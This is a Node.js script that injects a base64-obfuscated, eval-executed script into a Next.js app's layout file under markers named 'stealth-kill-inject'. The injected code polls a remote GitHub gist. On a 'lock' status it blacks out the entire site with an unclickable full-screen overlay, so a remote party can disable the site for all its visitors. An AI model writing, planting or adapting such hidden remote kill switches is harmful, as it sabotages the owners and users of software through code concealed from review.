const fs = require('fs');
const path = require('path');

const STATUS_URL = "https://gist.githubusercontent.com/jes4l/ef6246fb8abffbef2d80a5d72fee22ec/raw/status.json";
const layoutPath = path.join(process.cwd(), 'app/layout.tsx');

const rawScript = `
(function() {
  const STATUS_URL = "${STATUS_URL}";
  function check() {
    fetch(STATUS_URL + '?t=' + Date.now(), { cache: 'no-store' })
      .then(r => r.json())
      .then(d => {
        let overlay = document.getElementById('kill-overlay');
        if (d.status === 'lock') {
          if (!overlay) {
            overlay = document.createElement('div');
            overlay.id = 'kill-overlay';
            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:black;display:block;z-index:2147483647;pointer-events:all;';
            document.body.appendChild(overlay);
          }
        } else if (d.status === 'active' && overlay) {
          overlay.remove();
        }
        setTimeout(check, 3000);
      })
      .catch(() => setTimeout(check, 5000));
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', check);
  } else {
    check();
  }
})();
`;

const encoded = Buffer.from(rawScript).toString('base64');

const commentStart = "{/* stealth-kill-inject-start */}";
const commentEnd   = "{/* stealth-kill-inject-end */}";
const fullPayload = 
  commentStart +
  `<script dangerouslySetInnerHTML={{ __html: 'eval(atob("${encoded}"))' }} />` +
  commentEnd;

try {
  let content = fs.readFileSync(layoutPath, 'utf8');

  const markerRegex = new RegExp(
    `\\{\\/\\* stealth-kill-inject-start \\*\\/\\}[\\s\\S]*?\\{\\/\\* stealth-kill-inject-end \\*\\/\\}`,
    'g'
  );
  content = content.replace(markerRegex, '');

  const bodyRegex = /(<body[^>]*>)/i;
  if (bodyRegex.test(content)) {
    content = content.replace(bodyRegex, `$1\n  ${fullPayload}\n`);
    fs.writeFileSync(layoutPath, content);
    console.log('Active');
  } else {
    console.warn('Errored');
  }
} catch (e) {
  console.error('Failed:', e.message);
}